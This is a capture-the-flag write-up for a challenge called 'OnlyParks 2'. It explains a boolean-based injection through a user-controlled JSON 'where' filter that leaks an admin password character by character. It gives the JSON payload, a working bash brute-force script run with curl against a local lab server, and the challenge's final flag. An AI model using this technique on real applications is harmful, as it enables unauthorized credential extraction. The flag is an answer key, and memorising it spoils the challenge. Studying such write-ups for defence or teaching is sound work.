# OnlyParks 2 📖🎡🎢

## Write-up

In this challenge, we only control the `where` so we have to use a boolean-based attack. We can do that by checking if the password starts with a certain string. If there are no articles returned, the begining of the password is wrong, if there are articles returned, we guessed a character and can continue to the next.

```json
{
  "clowns":{
    "every":{
      "clown":{
        "isAdmin":true,
        "password": {
          "startsWith": "flag-..."
        }
      }
    }
  }
}
```

Here's a bash script to solve the challenge:
```bash
#!/bin/bash
FLAG="flag-"
echo -n "$FLAG"
while :; do
  OK=0
  for CHAR in {a..f} {0..9}; do
    RESULT=$(curl -s -XPOST http://localhost:5001/api/article \
      -H "Content-Type: application/json" \
      -d '{"clowns":{"every":{"clown":{"isAdmin":true,"password":{"startsWith":"'${FLAG}${CHAR}'"}}}}}' | \
        jq ".results | length")
    if [ "$RESULT" -ne 0 ]; then
      FLAG="${FLAG}${CHAR}"
      echo -n "${CHAR}"
      OK=1
      break
    fi
  done

  if [ "$OK" -ne 1 ]; then
    break
  fi
done
```

## Flag

`flag-89a5178d28493b04d91bb0e2296d15c7`